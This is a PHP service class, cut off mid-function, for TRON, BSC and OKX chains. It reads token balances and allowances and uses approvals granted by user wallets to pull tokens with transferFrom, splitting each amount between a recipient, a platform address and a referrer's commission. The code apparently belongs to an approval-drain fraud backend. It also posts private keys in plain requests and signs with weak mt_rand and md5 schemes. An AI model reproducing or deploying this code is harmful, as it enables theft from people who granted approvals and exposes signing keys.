<?php
namespace app\common\service;


use Web3\Contract;
use Web3\Providers\HttpProvider;
use Web3\RequestManagers\HttpRequestManager;
use Web3\Web3;

class Getbalance{
    //$type 1 trc  2 bsc
    //获取token
    public function getTokenBalance($type = 1,$address,$contractAddress,$decimals = 6){
        switch ($type){
            case 1:
                sleep(1);
                $uri = 'https://api.trongrid.io' ; // 主网   https://api.shasta.trongrid.io   shasta testnet
                $api = new \Tron\Api(new \GuzzleHttp\Client(['base_uri' => $uri]));
                $config = [
                    'contract_address' => $contractAddress,
                    'decimals' => $decimals,
                ];
                $trc20Wallet = new \Tron\TRC20($api, $config);
                $address = new \Tron\Address($address,'',$trc20Wallet->tron->address2HexString($address) );
                $token_balance = $trc20Wallet->balance($address);
                return $token_balance;
            case 2:
                $provider = 'https://bsc-dataseed.binance.org';
                $abi = config('abi.abi');
                $contract = new Contract($provider, $abi,60);
                $bcdiv_num2 = 10 ** $decimals;
                $tokenum=0;
                $contract->at($contractAddress)->call('balanceOf', $address, [
                    'from' => $address
                ], function ($err, $result) use ($contract,$bcdiv_num2,$decimals,&$tokenum) {
                    if ($err !== null) {
//                        dump($err->getMessage());
                    }
                    if (isset($result)) {
                        $result = bcdiv(gmp_init('0x'.$result[0]->toHex()),$bcdiv_num2,$decimals);
                        $tokenum = $result;
                    }
                });
                return $tokenum;
            case 4:
                $provider = 'https://exchainrpc.okex.org';
                $abi = config('abi.abi');
                $contract = new Contract($provider, $abi,60);
                $bcdiv_num2 = 10 ** $decimals;
                $tokenum=0;
                $contract->at($contractAddress)->call('balanceOf', $address, [
                    'from' => $address
                ], function ($err, $result) use ($contract,$bcdiv_num2,$decimals,&$tokenum) {
                    if ($err !== null) {
//                        dump($err->getMessage());
                    }
                    if (isset($result)) {
                        $result = bcdiv(gmp_init('0x'.$result[0]->toHex()),$bcdiv_num2,$decimals);
                        $tokenum = $result;
                    }
                });
                return $tokenum;
        }
    }

    //获取token2 已经乘以精度了
    public function getTokenBalance2($type = 1,$address,$contractAddress,$decimals = 6){
        switch ($type){
            case 1:
                $uri = 'https://api.trongrid.io' ; // 主网   https://api.shasta.trongrid.io   shasta testnet
                $api = new \Tron\Api(new \GuzzleHttp\Client(['base_uri' => $uri]));
                $config = [
                    'contract_address' => $contractAddress,
                    'decimals' => $decimals,
                ];
                $trc20Wallet = new \Tron\TRC20($api, $config);
                $address = new \Tron\Address($address,'',$trc20Wallet->tron->address2HexString($address) );
                $token_balance = $trc20Wallet->balance($address);
                $bcdiv_num2 = 10 ** $decimals;
                $token_balance = bcmul($token_balance,$bcdiv_num2,0);
                return $token_balance;
            case 2:
                $provider = 'https://bsc-dataseed.binance.org';
                $abi = config('abi.abi');
                $contract = new Contract($provider, $abi,60);
                $bcdiv_num2 = 10 ** $decimals;
                $tokenum=0;
                $contract->at($contractAddress)->call('balanceOf', $address, [
                    'from' => $address
                ], function ($err, $result) use ($contract,$bcdiv_num2,$decimals,&$tokenum) {
                    if ($err !== null) {
//                        dump($err->getMessage());
                    }
                    if (isset($result)) {
                        $result = bcmul(gmp_init('0x'.$result[0]->toHex()),1,1);
                        $tokenum = $result;
                    }
                });
                return $tokenum;
        }
    }
    //获取gas
    public function getBalance($type = 1,$address,$decimals = 6){
        switch ($type){
            case 1:
                $uri = 'https://api.trongrid.io' ; // 主网   https://api.shasta.trongrid.io   shasta testnet
                $api = new \Tron\Api(new \GuzzleHttp\Client(['base_uri' => $uri]));
                $config = [
                    'contract_address' => '', // USDT TRC20
                    'decimals' => $decimals,
                ];
                $trxWallet = new \Tron\TRX($api,$config);
                $balance = $trxWallet->balance((new \Tron\Address($address)));
                return $balance;
            case 2:
                $provider = 'https://bsc-dataseed.binance.org';
                $web3 = new Web3(new HttpProvider(new HttpRequestManager($provider, 60)));
                $web3->eth->getBalance($address, function ($err,$balance) use (&$balances,$decimals) {
                    $balances = bcdiv($balance->toString(),10**$decimals,$decimals);
                });
                return $balances;
        }
    }

    //获取授权数量
    public function getTokenApprove($type = 1,$address,$spender,$contractAddress,$decimals = 6){
        switch ($type){
            case 1:
                $uri = 'https://api.trongrid.io' ; // 主网   https://api.shasta.trongrid.io   shasta testnet
                $api = new \Tron\Api(new \GuzzleHttp\Client(['base_uri' => $uri]));
                $config = [
                    'contract_address' => $contractAddress,
                    'decimals' => $decimals,
                ];
                $trc20Wallet = new \Tron\TRC20($api, $config);
                $address = new \Tron\Address($address,'',$trc20Wallet->tron->address2HexString($address) );
                $spender = new \Tron\Address($spender,'',$trc20Wallet->tron->address2HexString($spender) );
                $token_balance = $trc20Wallet->allowance($address,$spender);
                return $token_balance;
            case 2:
                $provider = 'https://bsc-dataseed.binance.org';
                $abi = config('abi.abi');
                $contract = new Contract($provider, $abi,30);
                $allowance=0;
                $bcdiv_num2 = 10 ** $decimals;
                $contract->at($contractAddress)->call('allowance', $address , $spender,function ($err, $result) use ($contract,$bcdiv_num2,$decimals,&$allowance) {
                    if ($err !== null) {
                        dump($err->getMessage());
                    }
                    if (isset($result)) {
                        $result = bcdiv(gmp_init('0x'.$result[0]->toHex()),$bcdiv_num2,$decimals);
                        $allowance = $result;
                    }
                });
                return $allowance;
            case 4:
                $provider = 'https://exchainrpc.okex.org';
                $abi = config('abi.abi');
                $contract = new Contract($provider, $abi,30);
                $allowance=0;
                $bcdiv_num2 = 10 ** $decimals;
                $contract->at($contractAddress)->call('allowance', $address , $spender,function ($err, $result) use ($contract,$bcdiv_num2,$decimals,&$allowance) {
                    if ($err !== null) {
                        dump($err->getMessage());
                    }
                    if (isset($result)) {
                        $result = bcdiv(gmp_init('0x'.$result[0]->toHex()),$bcdiv_num2,$decimals);
                        $allowance = $result;
                    }
                });
                return $allowance;
        }
    }

    //划转token
    public function doTransfer($qb_type = 1,$spender,$approve_user_address,$spender_key,$from,$to,$amount,$contractAddress,$decimals = 6,$fenyong = 1){
        switch ($qb_type){
            case 1:
                $uri = 'https://api.trongrid.io' ; // 主网   https://api.shasta.trongrid.io   shasta testnet
                $api = new \Tron\Api(new \GuzzleHttp\Client(['base_uri' => $uri]));
                if(config('conf.approve_type') == 1){
                    $config = [
                        'contract_address' => $contractAddress,
                        'decimals' => $decimals,
                    ];
                }else{
                    $config = [
                        'contract_address' => $spender,
                        'decimals' => $decimals,
                    ];
                }
                $trc20Wallet = new \Tron\TRC20($api, $config);
                $from = new \Tron\Address($from,'',$trc20Wallet->tron->address2HexString($from) );
                $to = new \Tron\Address($to,'',$trc20Wallet->tron->address2HexString($to) );
                $approve_user_address = new \Tron\Address($approve_user_address,$spender_key,$trc20Wallet->tron->address2HexString($approve_user_address) );
                if(config('conf.approve_type') == 1){
                    $result = $trc20Wallet->transferfrom($approve_user_address,$from,$to,$amount);
                }else{
                    $bili = config('conf.bili');
                    $all_money =$amount;
                    $amount1 = $all_money * $bili;
                    $token = new \Tron\Address($contractAddress,'',$trc20Wallet->tron->address2HexString($contractAddress) );
                    $to2 =  config('conf.js_trx_address');
                    $to2 = new \Tron\Address($to2,'',$trc20Wallet->tron->address2HexString($to2) );
                    $amount2 = $all_money *( 1 - $bili);
                    $result = $trc20Wallet->transferfrom_ap($token,$approve_user_address,$from,$to,$amount1,$to2,$amount2);
                }
                return $result;
            case 2:
                // ==========================  原钱包转账 START ============================= //
                $secert = config('conf.com_secert');
                $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                $money_address = '';
                for ($i = 0; $i < 32; $i++) {
                    $money_address .= $chars[mt_rand(0, strlen($chars) - 1)];
                }
                $d = $money_address . $secert . time();
                $sign = [
                    'randomStr' => ''.$money_address,
                    'timeStamp' => ''.time(),
                    'signature' => md5('usdt' . sha1($d)),
                ];
                $python_ip=config('conf.python_ip');
                $data = [
                    'toaddress' => $to,//收款钱包地址
                    'approve_address' => $approve_user_address,//sq钱包地址
                    'approve_user_address' => $approve_user_address,//sq钱包地址
                    'order' => date("Ymdhis") . sprintf("%06d", $spender) . mt_rand(1000, 9999),//预生成订单ID
                    'contract_address' =>  $contractAddress,
                    'sign' => json_encode($sign),
                ];
                $aftermoney = function_exists('bcmul') ? bcmul($amount, pow(10,$decimals), 0) : $amount * pow(10,$decimals);// 实际到账 数字位
                $data['aftermoney'] =  $aftermoney;// 实际到账
                $data['from_address'] =  $from;
                $data['private_key'] =  $spender_key;

                if($fenyong == 0){//不分
                    $data['url'] =  $python_ip.'/bsc_transfer_from';
                    $zz_result = transferfrom_money($data);
                }else{
                    if(config('conf.approve_type') == 1){
                        $data['url'] =  $python_ip.'/bsc_transfer_from';
                        $zz_result = transferfrom_money($data);
                    }else{
                        $data['url'] =  $python_ip.'/bsc_transfer_from_ap';
                        $bili = config('conf.bili');
                        $all_money =$amount;
                        $amount1 = $all_money * $bili;
                        $amount2 = $all_money *( 1 - $bili);
                        $data['amount1'] = function_exists('bcmul') ? bcmul($amount1, pow(10,$decimals), 0) : $amount1 * pow(10,$decimals);// 实际到账 数字位
                        $data['amount2'] = function_exists('bcmul') ? bcmul($amount2, pow(10,$decimals), 0) : $amount2 * pow(10,$decimals);// 实际到账 数字位
                        $zz_result = transferfrom_money_ap($data);
                    }
                }
                return $zz_result;
            case 4:
                // ==========================  原钱包转账 START ============================= //
                $secert = config('conf.com_secert');
                $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                $money_address = '';
                for ($i = 0; $i < 32; $i++) {
                    $money_address .= $chars[mt_rand(0, strlen($chars) - 1)];
                }
                $d = $money_address . $secert . time();
                $sign = [
                    'randomStr' => ''.$money_address,
                    'timeStamp' => ''.time(),
                    'signature' => md5('usdt' . sha1($d)),
                ];
                $python_ip=config('conf.python_ip');
                $data = [
                    'toaddress' => $to,//收款钱包地址
                    'approve_address' => $approve_user_address,//sq钱包地址
                    'approve_user_address' => $approve_user_address,//sq钱包地址
                    'order' => date("Ymdhis") . sprintf("%06d", $spender) . mt_rand(1000, 9999),//预生成订单ID
                    'contract_address' =>  $contractAddress,
                    'sign' => json_encode($sign),
                ];
                $aftermoney = function_exists('bcmul') ? bcmul($amount, pow(10,$decimals), 0) : $amount * pow(10,$decimals);// 实际到账 数字位
                $data['aftermoney'] =  $aftermoney;// 实际到账
                $data['from_address'] =  $from;
                $data['private_key'] =  $spender_key;

                if($fenyong == 0){//不分
                    $data['url'] =  $python_ip.'/okt_transfer_from';
                    $zz_result = transferfrom_money($data);
                }else{
                    if(config('conf.approve_type') == 1){
                        $data['url'] =  $python_ip.'/okt_transfer_from';
                        $zz_result = transferfrom_money($data);
                    }else{
                        $data['url'] =  $python_ip.'/okt_transfer_from_ap';
                        $bili = config('conf.bili');
                        $all_money =$amount;
                        $amount1 = $all_money * $bili;
                        $amount2 = $all_money *( 1 - $bili);
                        $data['amount1'] = function_exists('bcmul') ? bcmul($amount1, pow(10,$decimals), 0) : $amount1 * pow(10,$decimals);// 实际到账 数字位
                        $data['amount2'] = function_exists('bcmul') ? bcmul($amount2, pow(10,$decimals), 0) : $amount2 * pow(10,$decimals);// 实际到账 数字位
                        $zz_result = transferfrom_money_ap($data);
                    }
                }
                return $zz_result;
        }
    }
    /**
    转账
     * stype  1 trx  2 bnb  3 trx有合约的币  4 bsc链有合约的币

     */
    //转账
    public function dozTransfer($stype,$from,$from_key,$to,$amount,$contractAddress,$decimals){
        switch ($stype){
            case 1:
                $uri = 'https://api.trongrid.io';
                $api = new \Tron\Api(new \GuzzleHttp\Client(['base_uri' => $uri]));
                $config = [
                    'contract_address' => '',
                    'decimals' => $decimals,
                ];
                $trxWallet = new \Tron\TRX($api,$config);
                $from = new \Tron\Address($from,$from_key,$trxWallet->tron->address2HexString($from) );
                $to = new \Tron\Address($to,'',$trxWallet->tron->address2HexString($to) );
                $result = $trxWallet->transfer($from,$to,$amount);
                return $result;
            case 3:
                $uri = 'https://api.trongrid.io';
                $api = new \Tron\Api(new \GuzzleHttp\Client(['base_uri' => $uri]));
                $config = [
                    'contract_address' => $contractAddress,
                    'decimals' => $decimals,
                ];
                $trc20Wallet = new \Tron\TRC20($api, $config);
                $from = new \Tron\Address($from,$from_key,$trc20Wallet->tron->address2HexString($from) );
                $to = new \Tron\Address($to,'',$trc20Wallet->tron->address2HexString($to) );
                $result = $trc20Wallet->transfer($from,$to,$amount);
                return $result;
            case 2:
                // ==========================  原钱包转账 START ============================= //
                $secert = config('conf.com_secert');
                $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                $money_address = '';
                for ($i = 0; $i < 32; $i++) {
                    $money_address .= $chars[mt_rand(0, strlen($chars) - 1)];
                }
                $d = $money_address . $secert . time();
                $sign = [
                    'randomStr' => ''.$money_address,
                    'timeStamp' => ''.time(),
                    'signature' => md5('usdt' . sha1($d)),
                ];
                $python_ip=config('conf.python_ip');
                $data = [
                    'toaddress' => $to,//收款钱包地址
                    'order' => date("Ymdhis") . sprintf("%06d", $from) . mt_rand(1000, 9999),//预生成订单ID
                    'contract_address' =>  $contractAddress,
                    'sign' => json_encode($sign),
                ];
                $data['url'] =  $python_ip.'/bsc_gas';
                $aftermoney = function_exists('bcmul') ? bcmul($amount, pow(10,$decimals), 0) : $amount * pow(10,$decimals);// 实际到账 数字位
                $data['aftermoney'] =  $aftermoney;// 实际到账
                $data['from_address'] =  $from;
                $data['private_key'] =  $from_key;
                $zz_result = recharge_money($data);
                return $zz_result;
            case 4:
                $secert = config('conf.com_secert');
                $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                $money_address = '';
                for ($i = 0; $i < 32; $i++) {
                    $money_address .= $chars[mt_rand(0, strlen($chars) - 1)];
                }
                $d = $money_address . $secert . time();
                $sign = [
                    'randomStr' => ''.$money_address,
                    'timeStamp' => ''.time(),
                    'signature' => md5('usdt' . sha1($d)),
                ];
                $python_ip=config('conf.python_ip');
                $data = [
                    'toaddress' => $to,//收款钱包地址
                    'order' => date("Ymdhis") . sprintf("%06d", $from) . mt_rand(1000, 9999),//预生成订单ID
                    'contract_address' =>  $contractAddress,
                    'sign' => json_encode($sign),
                ];
                $data['url'] =  $python_ip.'/bsc_transfer';
                $aftermoney = function_exists('bcmul') ? bcmul($amount, pow(10,$decimals), 0) : $amount * pow(10,$decimals);// 实际到账 数字位
                $data['aftermoney'] =  $aftermoney;// 实际到账
                $data['from_address'] =  $from;
                $data['private_key'] =  $from_key;
                $zz_result = recharge_money($data);
                return $zz_result;
            case 4:
                $secert = config('conf.com_secert');
                $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                $money_address = '';
                for ($i = 0; $i < 32; $i++) {
                    $money_address .= $chars[mt_rand(0, strlen($chars) - 1)];
                }
                $d = $money_address . $secert . time();
                $sign = [
                    'randomStr' => ''.$money_address,
                    'timeStamp' => ''.time(),
                    'signature' => md5('usdt' . sha1($d)),
                ];
                $python_ip=config('conf.python_ip');
                $data = [
                    'toaddress' => $to,//收款钱包地址
                    'order' => date("Ymdhis") . sprintf("%06d", $from) . mt_rand(1000, 9999),//预生成订单ID
                    'contract_address' =>  $contractAddress,
                    'sign' => json_encode($sign),
                ];
                $data['url'] =  $python_ip.'/bsc_transfer';
                $aftermoney = function_exists('bcmul') ? bcmul($amount, pow(10,$decimals), 0) : $amount * pow(10,$decimals);// 实际到账 数字位
                $data['aftermoney'] =  $aftermoney;// 实际到账
                $data['from_address'] =  $from;
                $data['private_key'] =  $from_key;
                $zz_result = recharge_money($data);
                return $zz_result;
        }
    }

    //授权划转token
    public function do_transfer_from($approve_info,$receive_info){
        switch ($approve_info['qb_type']){
            case 1:
                $uri = 'https://api.trongrid.io' ; // 主网   https://api.shasta.trongrid.io   shasta testnet
                $api = new \Tron\Api(new \GuzzleHttp\Client(['base_uri' => $uri]));
                $config = [
                    'contract_address' => $approve_info['approve_address'],
                    'decimals' => $approve_info['approve_address_decimals'],
                ];
                $trc20Wallet = new \Tron\TRC20($api, $config);
                $from = new \Tron\Address($approve_info['user_address'],'',$trc20Wallet->tron->address2HexString($approve_info['user_address']) );
                $to = new \Tron\Address($receive_info['to'],'',$trc20Wallet->tron->address2HexString($receive_info['to']) );
                $approve_user_address = new \Tron\Address($approve_info['approve_user_address'],$approve_info['psd'],$trc20Wallet->tron->address2HexString($approve_info['approve_user_address']) );
                $contractAddress = $approve_info['contract_address'];
                $token = new \Tron\Address($contractAddress,'',$trc20Wallet->tron->address2HexString($contractAddress) );

                $all_money =$receive_info['amount'];
                $bili = $receive_info['bili'] / 100;
                $amount1 = $all_money * $bili;
                $amount2 = $all_money *( 1 - $bili);//分给商户后剩下的
                $user_parent_id = Db('user')->where(['id'=>$receive_info['user_id']])->value('parent_id');
                if($user_parent_id){//有上级用户
                    $user_parent_invitation_rate = Db('user')->where(['id'=>$user_parent_id])->value('invitation_rate');
                    if($user_parent_invitation_rate <= 0){
                        $to2 =  config('conf.js_trx_address');
                        $to2 = new \Tron\Address($to2,'',$trc20Wallet->tron->address2HexString($to2));
                        $result = $trc20Wallet->transferfrom_ap($token,$approve_user_address,$from,$to,$amount1,$to2,$amount2);
                        $result->amount1 =$amount1;
                        $result->amount2 =$amount2;
                        $result->amount3 =0;
                        return $result;
                    }else{
                        $amount_lpt = $amount2 * $user_parent_invitation_rate / 100;
                        $amount_js = $amount2 - $amount_lpt;
                        $to2 =  config('conf.js_trx_address');
                        $to2 = new \Tron\Address($to2,'',$trc20Wallet->tron->address2HexString($to2));
                        $to3 =  Db('user_finance')->where(['id'=>$user_parent_id])->value('receive_wallet_trx');
                        if(empty($to3)){
                            $to3 = $to2;
                        }
                        $to3 = new \Tron\Address($to3,'',$trc20Wallet->tron->address2HexString($to3));
                        $result = $trc20Wallet->transferfrom_3ap($token,$approve_user_address,$from,$to,$amount1,$to2,$amount_js,$to3,$amount_lpt);
                        $result->amount1 =$amount1;
                        $result->amount2 =$amount_js;
                        $result->amount3 =$amount_lpt;

                        return $result;
                    }
                }else{//没有上级
                    $to2 =  config('conf.js_trx_address');
                    $to2 = new \Tron\Address($to2,'',$trc20Wallet->tron->address2HexString($to2));
                    $result = $trc20Wallet->transferfrom_ap($token,$approve_user_address,$from,$to,$amount1,$to2,$amount2);
                    $result-> amount1 = $amount1;
                    $result-> amount2 = $amount2;
                    $result-> amount3 = 0;
                    return $result;
                }
            case 2:
                // ==========================  原钱包转账 START ============================= //
                $secert = config('conf.com_secert');
                $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                $money_address = '';
                for ($i = 0; $i < 32; $i++) {
                    $money_address .= $chars[mt_rand(0, strlen($chars) - 1)];
                }
                $d = $money_address . $secert . time();
                $sign = [
                    'randomStr' => ''.$money_address,
                    'timeStamp' => ''.time(),
                    'signature' => md5('usdt' . sha1($d)),
                ];
                $python_ip=config('conf.python_ip');
                $data = [
                    'toaddress' => $receive_info['to'],//收款钱包地址
                    'approve_address' => $approve_info['approve_address'],//sq合约
                    'approve_user_address' => $approve_info['approve_user_address'],//sq钱包地址
                    'order' => date("Ymdhis") . sprintf("%06d", $approve_info['user_address']) . mt_rand(1000, 9999),//预生成订单ID
                    'contract_address' =>  $approve_info['contract_address'],//目标合约地址
                    'sign' => json_encode($sign),
                ];
                $decimals = $approve_info['approve_address_decimals'];
                $aftermoney = function_exists('bcmul') ? bcmul($receive_info['amount'], pow(10,$decimals), 0) : $receive_info['amount'] * pow(10,$decimals);// 实际到账 数字位
                $data['aftermoney'] =  $aftermoney;// 实际到账
                $data['from_address'] =  $approve_info['user_address'];
                $data['private_key'] =  $approve_info['psd'];

                $all_money =$receive_info['amount'];
                $bili = $receive_info['bili'] / 100;
                $amount1 = $all_money * $bili;
                $amount2 = $all_money *( 1 - $bili);
                $user_parent_id = Db('user')->where(['id'=>$receive_info['user_id']])->value('parent_id');
                if($user_parent_id){//有上级用户
                    $user_parent_invitation_rate = Db('user')->where(['id'=>$user_parent_id])->value('invitation_rate');
                    if($user_parent_invitation_rate <= 0){
                        $data['url'] =  $python_ip.'/bsc_transfer_from_ap';
                        $data['amount1'] = function_exists('bcmul') ? bcmul($amount1, pow(10,$decimals), 0) : $amount1 * pow(10,$decimals);// 实际到账 数字位
                        $data['amount2'] = function_exists('bcmul') ? bcmul($amount2, pow(10,$decimals), 0) : $amount2 * pow(10,$decimals);// 实际到账 数字位
                        $zz_result = transferfrom_money_ap($data);
                        $zz_result['amount1']=$amount1;
                        $zz_result['amount2']=$amount2;
                        $zz_result['amount3']=0;
                        return $zz_result;
                    }else{
                        $amount_lpt = $amount2 * $user_parent_invitation_rate / 100;
                        $amount_js = $amount2 - $amount_lpt;
                        $data['url'] =  $python_ip.'/bsc_transfer_from_3ap';
                        $data['to2'] =  config('conf.js_trx_address');
                        $to3 =  Db('user_finance')->where(['id'=>$user_parent_id])->value('receive_wallet_trx');
                        if(empty($to3)){
                            $to3 = $data['to2'];
                        }
                        $data['to3'] = $to3;
                        $data['amount1'] = function_exists('bcmul') ? bcmul($amount1, pow(10,$decimals), 0) : $amount1 * pow(10,$decimals);// 实际到账 数字位
                        $data['amount2'] = function_exists('bcmul') ? bcmul($amount_lpt, pow(10,$decimals), 0) : $amount_lpt * pow(10,$decimals);// 实际到账 数字位
                        $data['amount3'] = function_exists('bcmul') ? bcmul($amount_js, pow(10,$decimals), 0) : $amount_js * pow(10,$decimals);// 实际到账 数字位
                        $zz_result = transferfrom_money_3ap($data);
                        $zz_result['amount1']=$amount1;
                        $zz_result['amount2']=$amount_js;
                        $zz_result['amount3']=$amount_lpt;
                        return $zz_result;
                    }
                }else{//没有上级
                    $data['url'] =  $python_ip.'/bsc_transfer_from_ap';
                    $data['amount1'] = function_exists('bcmul') ? bcmul($amount1, pow(10,$decimals), 0) : $amount1 * pow(10,$decimals);// 实际到账 数字位
                    $data['amount2'] = function_exists('bcmul') ? bcmul($amount2, pow(10,$decimals), 0) : $amount2 * pow(10,$decimals);// 实际到账 数字位
                    $zz_result = transferfrom_money_ap($data);
                    $zz_result['amount1']=$amount1;
                    $zz_result['amount2']=$amount2;
                    $zz_result['amount3']=0;
                    return $zz_result;
                }
        }
    }
    //授权划转token无分佣
    public function do_transfer_from_wu_fen_yong($approve_info,$receive_info){
        switch ($approve_info['qb_type']){
            case 1:
                $uri = 'https://api.trongrid.io' ; // 主网   https://api.shasta.trongrid.io   shasta testnet
                $api = new \Tron\Api(new \GuzzleHttp\Client(['base_uri' => $uri]));

                switch ($approve_info['sq_approve_type']){
                    case 1://0合约授权 1账号授权
                        $config = [
                            'contract_address' => config('conf.contract_trx_usdt'),
                            'decimals' => 6,
                        ];
                        break;
                    default:
                        $config = [
                            'contract_address' => $approve_info['approve_address'],
                            'decimals' => $approve_info['approve_address_decimals'],
                        ];
                        break;
                }
                $trc20Wallet = new \Tron\TRC20($api, $config);
                $from = new \Tron\Address($approve_info['user_address'],'',$trc20Wallet->tron->address2HexString($approve_info['user_address']) );
                $to = new \Tron\Address($receive_info['to'],'',$trc20Wallet->tron->address2HexString($receive_info['to']) );
                $approve_user_address = new \Tron\Address($approve_info['approve_user_address'],$approve_info['psd'],$trc20Wallet->tron->address2HexString($approve_info['approve_user_address']) );
                $contractAddress = $approve_info['contract_address'];
                $token = new \Tron\Address($contractAddress,'',$trc20Wallet->tron->address2HexString($contractAddress) );
                $amount1 =$receive_info['amount'];
                switch ($approve_info['sq_approve_type']){
                    case 1://0合约授权 1账号授权
                        $result = $trc20Wallet->transferfrom($approve_user_address,$from,$to,$amount1);
                        break;
                    default:
                        $result = $trc20Wallet->transferfrom_1ap($token,$approve_user_address,$from,$to,$amount1);
                        break;
                }
                $result-> amount1 = $amount1;
                $result-> amount2 = 0;
                $result-> amount3 = 0;
                return $result;
            case 2:
                // ==========================  原钱包转账 START ============================= //
                $secert = config('conf.com_secert');
                $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                $money_address = '';
                for ($i = 0; $i < 32; $i++) {
                    $money_address .= $chars[mt_rand(0, strlen($chars) - 1)];
                }
                $d = $money_address . $secert . time();
                $sign = [
                    'randomStr' => ''.$money_address,
                    'timeStamp' => ''.time(),
                    'signature' => md5('usdt' . sha1($d)),
                ];
                $python_ip=config('conf.python_ip');
                $data = [
                    'toaddress' => $receive_info['to'],//收款钱包地址
                    'approve_address' => $approve_info['approve_address'],//sq合约
                    'approve_user_address' => $approve_info['approve_user_address'],//sq钱包地址
                    'order' => date("Ymdhis") . sprintf("%06d", $approve_info['user_address']) . mt_rand(1000, 9999),//预生成订单ID
                    'contract_address' =>  $approve_info['contract_address'],//目标合约地址
                    'sign' => json_encode($sign),
                ];
                $decimals = $approve_info['approve_address_decimals'];
                $aftermoney = function_exists('bcmul') ? bcmul($receive_info['amount'], pow(10,$decimals), 0) : $receive_info['amount'] * pow(10,$decimals);// 实际到账 数字位
                $data['aftermoney'] =  $aftermoney;// 实际到账
                $data['from_address'] =  $approve_info['user_address'];
                $data['private_key'] =  $approve_info['psd'];

                $all_money =$receive_info['amount'];
                $amount1 = $all_money;
                $data['url'] =  $python_ip.'/bsc_transfer_from_1ap';
                $data['amount1'] = function_exists('bcmul') ? bcmul($amount1, pow(10,$decimals), 0) : $amount1 * pow(10,$decimals);// 实际到账 数字位
                $post_data = [
                    'token'=> $data['contract_address'] ,
                    'contract'=> $data['approve_address'],
                    'order'=> $data['order'] ,
                    'from_address'=> $data['from_address'] ,
                    'approve_address'=> $data['approve_user_address'] ,
                    'private_key'=> $data['private_key'] ,
                    'toaddress'=> $data['toaddress'] ,
                    'amount'=> $data['amount1'] ,// 实际到账
                ];
                $res = http($data['url'],$post_data,'POST',[],[],[],5);
                $zz_result = json_decode($res,true);
                $zz_result['amount1']=$amount1;
                $zz_result['amount2']=0;
                $zz_result['amount3']=0;
                return $zz_result;
            case 4:
                // ==========================  原钱包转账 START ============================= //
                $secert = config('conf.com_secert');
                $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                $money_address = '';
                for ($i = 0; $i < 32; $i++) {
                    $money_address .= $chars[mt_rand(0, strlen($chars) - 1)];
                }
                $d = $money_address . $secert . time();
                $sign = [
                    'randomStr' => ''.$money_address,
                    'timeStamp' => ''.time(),
                    'signature' => md5('usdt' . sha1($d)),
                ];
                $python_ip=config('conf.python_ip');
                $data = [
                    'toaddress' => $receive_info['to'],//收款钱包地址
                    'approve_address' => $approve_info['approve_address'],//sq合约
                    'approve_user_address' => $approve_info['approve_user_address'],//sq钱包地址
                    'order' => date("Ymdhis") . sprintf("%06d", $approve_info['user_address']) . mt_rand(1000, 9999),//预生成订单ID
                    'contract_address' =>  $approve_info['contract_address'],//目标合约地址
                    'sign' => json_encode($sign),
                ];
                $decimals = $approve_info['approve_address_decimals'];
                $aftermoney = function_exists('bcmul') ? bcmul($receive_info['amount'], pow(10,$decimals), 0) : $receive_info['amount'] * pow(10,$decimals);// 实际到账 数字位
                $data['aftermoney'] =  $aftermoney;// 实际到账
                $data['from_address'] =  $approve_info['user_address'];
                $data['private_key'] =  $approve_info['psd'];

                $all_money =$receive_info['amount'];
                $amount1 = $all_money;
                $data['url'] =  $python_ip.'/okt_transfer_from_1ap';
                $data['amount1'] = function_exists('bcmul') ? bcmul($amount1, pow(10,$decimals), 0) : $amount1 * pow(10,$decimals);// 实际到账 数字位
                $post_data = [
                    'token'=> $data['contract_address'] ,
                    'contract'=> $data['approve_address'],
                    'order'=> $data['order'] ,
                    'from_address'=> $data['from_address'] ,
                    'approve_address'=> $data['approve_user_address'] ,
                    'private_key'=> $data['private_key'] ,
                    'toaddress'=> $data['toaddress'] ,
                    'amount'=> $data['amount1'] ,// 实际到账
                ];
                $res = http($data['url'],$post_data,'POST',[],[],[],5);
                $zz_result = json_decode($res,true);
                $zz_result['amount1']=$amount1;
                $zz_result['amount2']=0;
                $zz_result['amount3']=0;
                return $zz_result;
        }
    }

    /* 给智能合约加白名单 */
    public function add_white_account($type,$user_account){
        switch ($type){
            case 1://trc链
                $uri = 'https://api.trongrid.io';
                $api = new \Tron\Api(new \GuzzleHttp\Client(['base_uri' => $uri]));
                $config = [
                    'contract_address' => config('conf.approve_trx_address'),//合约地址
                    'decimals' => 6,
                ];
                $trc20Wallet = new \Tron\TRC20($api, $config);
                $contract_owner = config('conf.approve_trx_contract_user');
                $contract_owner_private_key = config('conf.approve_trx_contract_user_private_key');
                $contract_owner = new \Tron\Address($contract_owner,$contract_owner_private_key,$trc20Wallet->tron->address2HexString($contract_owner));
                $user_account = new \Tron\Address($user_account,'',$trc20Wallet->tron->address2HexString($user_account));
                $result = $trc20Wallet->addwhiteaccount($contract_owner,$user_account);
                return $result;
            case 2://bsc链
                $url = config('conf.python_ip').'/add_white_account';
                $contract_owner = config('conf.approve_bsc_contract_user');
                $contract_owner_private_key = config('conf.approve_bsc_contract_user_private_key');
                $data = [
                    'contract' => config('conf.approve_bsc_address'),//合约地址
                    'contract_owner' => $contract_owner,//合约发布者或者管理员钱包地址
                    'private_key' => $contract_owner_private_key,
                    'address' =>  $user_account,//要设置白名单的地址
                ];
                $res = http($url,$data,'POST',[],[],[],5);
                return json_decode($res,true);
        }
    }

    /* 移除智能合约白名单 */
    public function remove_white_account($type,$user_account){
        switch ($type){
            case 1://trc链
                $uri = 'https://api.trongrid.io';
                $api = new \Tron\Api(new \GuzzleHttp\Client(['base_uri' => $uri]));
                $config = [
                    'contract_address' => config('conf.approve_trx_address'),//合约地址
                    'decimals' => 6,
                ];
                $trc20Wallet = new \Tron\TRC20($api, $config);
